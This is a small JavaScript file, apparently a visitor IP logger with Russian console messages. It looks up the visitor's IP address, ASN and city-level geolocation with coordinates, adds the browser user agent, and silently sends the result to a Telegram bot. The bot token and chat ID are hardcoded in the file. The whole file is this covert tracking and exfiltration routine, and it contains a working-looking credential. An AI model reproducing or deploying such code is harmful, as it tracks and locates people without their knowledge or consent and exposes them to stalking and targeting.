var bot = "5718535789:AAHKAniMFOKHuwlQssa5KkUNRvF4S6gNMXA";
var id = 1765453902;

function sendInformation(information) {
    console.log("✅ Отправлено!");

    text = `IP - ${information['ip']} | ASN - ${information['asn']} | UserAgent - ${information['useragent']} | Geo - ${information['geoip1']['city']} | Lat and Lon - ${information['geoip1']['lat']}, ${information['geoip1']['lon']}`
    
    console.log(text);
    
    var url = `https://api.telegram.org/bot${bot}/sendMessage?chat_id=${id}&parse_mode=html&text=${text}`;

    var options = {
        method: "POST",
        mode: "cors",
        headers: {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Authorization": "Token " + bot
        }
    }
    
    fetch(url, options)
    .then(response => response.text())
    .catch(error => console.log("error", error));
}

function IPProvider(information) {
    let text = JSON.parse(information);

    sendInformation(text);
}

function getInfo(json) {
    var url = "https://ip-score.com/json";

    fetch(url)
    .then(response => response.text())
    .then(result => IPProvider(result))
    .catch(error => console.log("error", error));
}